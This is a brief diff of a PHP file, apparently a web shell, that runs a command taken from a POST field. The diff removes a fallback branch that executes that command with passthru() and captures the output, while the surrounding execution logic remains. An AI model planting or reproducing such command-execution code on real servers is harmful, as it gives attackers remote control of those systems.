@@ -62,14 +62,6 @@ if (isset( $_POST['command'])):
 			$output = ob_get_contents();
 			ob_end_clean();
 		}
-		// Try: passthru
-		else if(function_exists('passthru'))
-		{
-			ob_start();
-			passthru($command , $return_var);
-			$output = ob_get_contents();
-			ob_end_clean();
-		}
 	
 		// No function exists
 		else
